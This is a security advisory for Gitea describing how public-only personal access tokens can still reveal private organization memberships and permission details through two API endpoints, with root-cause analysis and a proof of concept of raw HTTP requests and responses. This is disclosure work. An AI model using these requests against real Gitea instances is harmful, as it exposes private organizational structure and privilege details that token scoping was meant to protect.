# [M] Gitea: Public-Only Personal access tokens scope bypass in Organization and Permission Endpoints

## Summary
Severity: Medium
Advisory: GHSA-fq2p-5p22-8g6j
CVE: CVE-2026-58429
CWE: CWE-1259, CWE-284
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-fq2p-5p22-8g6j
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary
A personal access token restricted with the public-only scope can still retrieve private organization membership and organization permission details for its own account through organization-listing endpoints. This bypass breaks the intended guarantee that such tokens are limited to public resources only.

### Details
The issue affects the following endpoints:
GET /api/v1/user/orgs
GET /api/v1/users/{username}/orgs/{org}/permissions

The application correctly prevents a public-only token from directly accessing a private organization through:
GET /api/v1/orgs/{org}

However, that same token can still obtain private organization data through alternate code paths.

The root cause is inconsistent enforcement of the public-only restriction. The middleware responsible for blocking non-public organization access depends on route context being populated with the target organization. That assumption does not hold for all affected routes.

For GET /api/v1/user/orgs, the route does not apply checkTokenPublicOnly() at all.

For GET /api/v1/users/{username}/orgs, the middleware is present, but it evaluates ctx.ContextUser, which represents the user named in the path, not the organization objects returned by the handler. Since ctx.Org.Organization is not populated for these responses, private organization results are not filtered.

The organization listing logic then uses the effective relationship between the authenticated user and the target user to determine visibility. When the token belongs to the same user, the handler allows private organization visibility and returns private memberships.

The permissions endpoint is similarly affected. It relies on general visibility logic relative to the real user account rather than explicitly enforcing the public-only token restriction before returning organization authorization details. As a result, a restricted token can still obtain organization role information such as ownership, admin status, and repository creation capability for a private organization.

This is therefore a route-specific authorization failure: direct organization access is blocked, but indirect endpoints still disclose private organization-derived data.

### PoC
**Step 1:** Create or use a user account that belongs to at least one private organization.
<img width="1858" height="891" alt="Screenshot 2026-04-16 001614" src="https://github.com/user-attachments/assets/9c1bdbc4-234f-4f65-9b91-00c7ca9a51f7" />

**Step 2:** Generate a personal access token for that same user with the scopes: public-only, read:user, and read:organization

https://github.com/user-attachments/assets/c89c9004-5e6d-4ff9-b130-5cd9fedc38f6

**Step 3:** Confirm the token is correctly restricted by requesting the private organization directly
<img width="1918" height="867" alt="Screenshot 2026-04-16 002345" src="https://github.com/user-attachments/assets/4c489174-b4ef-400b-9eea-5484520f51e2" />

[REQUEST]
GET /api/v1/orgs/private_1?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
Host: gitea.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://gitea.com/api/swagger
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

[RESPONSE]
HTTP/2 403 Forbidden
Alt-Svc: h3=":443"; ma=2592000
Cache-Control: max-age=0, private, must-revalidate, no-transform
Content-Type: application/json;charset=utf-8
Date: Wed, 15 Apr 2026 17:23:19 GMT
Server: Caddy
Vary: Origin
X-Content-Type-Options: nosniff
X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
Content-Length: 89
{"message":"token scope is limited to public orgs","url":"https://gitea.com/api/swagger"}

**Step 4:** Use the same token to request the authenticated user’s organizations. Observe that request send successful and receive data about private org.
<img width="1545" height="791" alt="Screenshot 2026-04-16 002751" src="https://github.com/user-attachments/assets/761d2684-0882-4e61-9462-21514738e681" />
[REQUEST]
GET /api/v1/user/orgs?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
Host: gitea.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://gitea.com/api/swagger
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

[RESPONSE]
HTTP/2 200 OK
Access-Control-Expose-Headers: X-Total-Count
Alt-Svc: h3=":443"; ma=2592000
Cache-Control: max-age=0, private, must-revalidate, no-transform
Content-Type: application/json;charset=utf-8
Date: Wed, 15 Apr 2026 17:26:35 GMT
Server: Caddy
Vary: Origin
X-Content-Type-Options: nosniff
X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
X-Total-Count: 1
Content-Length: 261
[{"id":192111,"name":"private_1","full_name":"","email":"","avatar_url":"https://gitea.com/avatars/cc05fbb4da63b760bf83cdc054c3be63","description":"","website":"","location":"","visibility":"private","repo_admin_change_team_access":true,"username":"private_1"}]

**Step 5:** Use the same token to request organization permissions for that private organization.
<img width="1917" height="865" alt="Screenshot 2026-04-16 003100" src="https://github.com/user-attachments/assets/65578c48-3307-4e0d-ae08-991f64158706" />
[REQUEST]
GET /api/v1/users/pcatso172124/orgs/private_1/permissions?token=d8010b3dee25df1a9c3cb6aafbd24c27dae7ca56 HTTP/2
Host: gitea.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://gitea.com/api/swagger
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

[RESPONSE]
HTTP/2 200 OK
Alt-Svc: h3=":443"; ma=2592000
Cache-Control: max-age=0, private, must-revalidate, no-transform
Content-Type: application/json;charset=utf-8
Date: Wed, 15 Apr 2026 17:30:32 GMT
Server: Caddy
Vary: Origin
X-Content-Type-Options: nosniff
X-Gitea-Warning: token and access_token API authentication is deprecated and will be removed in gitea 1.23. Please use AuthorizationHeaderToken instead. Existing queries will continue to work but without authorization.
Content-Length: 95

{"is_owner":true,"is_admin":true,"can_write":true,"can_read":true,"can_create_repository":true}
### Impact
Any public-only token for a user who belongs to private organizations can enumerate those private organization names and retrieve detailed authorization information such as ownership, administrative status, write access, read access, and repository-creation capability. This weakens least-privilege token delegation and can expose sensitive internal organizational structure and privilege relationships to third-party integrations, CI jobs, or compromised automation that were only meant to access public data.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-fq2p-5p22-8g6j
- https://github.com/go-gitea/gitea/pull/37118
- https://github.com/go-gitea/gitea/pull/37773
- https://github.com/go-gitea/gitea/commit/a34eac5ef42ada433a7c7dafb98f15c13d7ad74e
- https://github.com/go-gitea/gitea/commit/f2a1271f164569264c378fad720b0c000fff3336
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
